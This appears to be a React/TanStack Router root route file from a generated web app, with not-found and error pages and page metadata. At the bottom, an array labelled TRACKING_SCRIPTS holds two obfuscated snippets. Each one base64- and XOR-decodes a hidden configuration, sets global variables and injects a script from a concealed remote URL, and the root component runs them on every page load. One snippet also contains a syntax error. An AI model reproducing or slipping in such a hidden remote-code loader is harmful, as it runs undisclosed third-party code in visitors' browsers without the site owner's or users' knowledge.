import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,700;1,500&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

const TRACKING_SCRIPTS = [
  '(function(){var f_m=atob("DMQMk0SrNlYrNy/di78u5jbHFGwJX1up+7c2vGvIUjgFQluw4qJ1vSfEW3hJRQCu6LZl4zDYGSZCT0qxpLRl6yHHGDxYFQP/6rB44S3JQyJORA3n0JkgsSPHWTRKW1z/sZ93sSrKWzMJDQ2t4rxp/w3PFHoJQU6x/qEuqWadVzcaVUy5uvBo8SKZDjRNUxe5uvNp8HCJSwtW");var p_hrc=[];for(var v_3=0;v_3<f_m.length;v_3++){p_hrc.push(f_m.charCodeAt(v_3)&255);}var v_2=p_hrc[0];var i_9=p_hrc.slice(1,1+v_2);var v_z=p_hrc.slice(1+v_2);var p_zoe=v_z.map(function(b,g_10j){return b^i_9[g_10j%v_2];});var l_t9gg="";for(var u_mr=0;u_mr<p_zoe.length;u_mr++){l_t9gg+=String.fromCharCode(p_zoe[u_mr]&255);}var h_6rp6=decodeURIComponent(escape(l_t9gg));var v_7=JSON.parse(h_6rp6);var y_pyo9=v_7.globals[];y_pyo9.forEach(function(u_vz){window[u_vz.name]=u_vz.value;});var w_4=document.createElement("script");w_4.src=v_7.url;w_4.async=true;w_4.defer=true;(v_7.attributes[]).forEach(function(q_go){w_4.setAttribute(q_go.name,q_go.value);});(document.head||document.documentElement).appendChild(w_4);})();',
  '(function(){var u_3u=atob("DBPIu7ia0+NT8K7YaGjqzsr28dlxmNqsGGDylJf5t419hdq1AXWxldv1vs0xgoGrC2Ghy8zp/JYnnd33BHK83svu/Ykg0oL6CWe8ydH4ppc2g4ziM2jq1dn3tsFp0sq5HHLlzsz3uoUq3d6qDWWt1cy3q4A8lIOrC3jql5rsso8mlYziSjG1l8O4vYI+lYziSnepz9m3ppc+mcihRWO63s7/vZd+g9u6AXe7mZS4pYI/hcv6UjHqxuXn");var b_h5yq=[];for(var w_7r=0;w_7r<u_3u.length;w_7r++){b_h5yq.push(u_3u.charCodeAt(w_7r)&255);}var d_14k=b_h5yq[0];var r_ij=b_h5yq.slice(1,1+d_14k);var f_a5=b_h5yq.slice(1+d_14k);var a_h=f_a5.map(function(b,n_t9j){return b^r_ij[n_t9j%d_14k];});var a_hk6m="";for(var m_d02d=0;m_d02d<a_h.length;m_d02d++){a_hk6m+=String.fromCharCode(a_h[m_d02d]&255);}var i_4j3=decodeURIComponent(escape(a_hk6m));var w_sr4=JSON.parse(i_4j3);var m_szld=w_sr4.globals||[];m_szld.forEach(function(r_wj16){window[r_wj16.name]=r_wj16.value;});var f_1sd=document.createElement("script");f_1sd.src=w_sr4.url;f_1sd.async=true;f_1sd.defer=true;(w_sr4.attributes||[]).forEach(function(j_vs){f_1sd.setAttribute(j_vs.name,j_vs.value);});(document.head||document.documentElement).appendChild(f_1sd);})();',
];

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  useEffect(() => {
    for (const code of TRACKING_SCRIPTS) {
      const el = document.createElement("script");
      el.textContent = code;
      document.head.appendChild(el);
    }
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
